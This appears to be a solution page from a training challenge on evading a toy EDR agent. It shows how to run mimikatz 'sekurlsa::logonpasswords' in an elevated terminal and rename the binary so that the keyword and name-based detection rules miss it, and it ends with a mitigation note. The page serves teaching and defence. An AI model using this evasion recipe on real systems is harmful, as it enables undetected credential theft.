---
title: "Solution 16: Elevated Process Evasion"
difficulty: medium
category: "Execution Evasion"
---

[Back to Challenge]({{ '/challenges/16-elevated-process/' | relative_url }})

## Overview

When the EDR runs as a standard user, it cannot read the PEB of elevated (administrator) processes. This makes all command-line-based rules (2, 4, 5) ineffective against elevated processes.

## Solution

```powershell
# Run the EDR as standard user:
.\edr_agent.exe --verbose

# In a separate elevated (admin) terminal:
mimikatz.exe "sekurlsa::logonpasswords" exit
# Rule 1 catches "mimikatz.exe" (process name is visible to all)
# But Rules 2, 4, 5 get empty command line -> no keyword detection

# With a renamed binary (bypasses Rule 1 too):
copy mimikatz.exe m.exe
# Run in admin terminal:
.\m.exe "sekurlsa::logonpasswords" exit
# Rule 1: "m.exe" not blacklisted -> pass
# Rules 2, 4, 5: command line unreadable -> pass
# Result: completely undetected
```

## Why It Works

`OpenProcess` with `PROCESS_QUERY_INFORMATION | PROCESS_VM_READ` fails when trying to access a higher-privilege process. The `getCommandLine` function returns an empty string, and empty strings match no keywords.

## Mitigation

Real EDR agents run as SYSTEM (highest privilege) so they can read any process. The kernel driver approach (in `src/driver/driver.cpp`) captures command lines at creation time in kernel mode, which is not subject to these access restrictions.
